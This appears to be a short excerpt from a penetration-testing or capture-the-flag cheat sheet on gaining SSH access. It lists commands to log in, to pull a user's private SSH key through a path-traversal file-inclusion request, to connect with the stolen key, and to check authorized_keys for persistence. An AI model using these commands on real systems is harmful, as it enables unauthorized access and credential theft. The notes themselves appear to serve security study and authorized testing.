- `you can’t get initial access directly however we can login with user and password and private key`

### <span style="color:#50FA7B">Login with username & password (if known):</span>

```bash
ssh $USER@$VICTIM_IP
ssh -p 2222 $USER@$VICTIM_IP     # Custom SSH port
```
### <span style="color:#50FA7B">Leak private key via LFI or web access:</span>

```bash
curl http://$VICTIM_IP/index.php?page=../../../../home/$USER/.ssh/id_rsa
```
### <span style="color:#50FA7B">Set permissions & connect with private key:</span>

```bash
chmod 600 id_rsa
ssh -i id_rsa -p 2222 $USER@$VICTIM_IP
```
### <span style="color:#50FA7B">Look for authorized keys (for persistence or recon):</span>

```bash
~/.ssh/authorized_keys
```
